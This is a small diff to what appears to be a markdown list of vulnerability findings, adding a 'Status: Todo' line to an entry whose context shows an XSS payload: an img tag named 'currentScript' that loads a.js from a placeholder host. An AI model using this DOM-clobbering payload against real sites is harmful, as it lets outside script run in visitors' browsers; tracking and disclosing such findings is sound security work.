@@ -9,6 +9,7 @@
 + Payload: ```<img name=currentScript src="https://xxx.xxx.xxx/a.js"></img>```
 + Impact: XSS
 + CVE: N/A
++ Status: Todo
 + Foundby: TheHulk
 
 ### Library
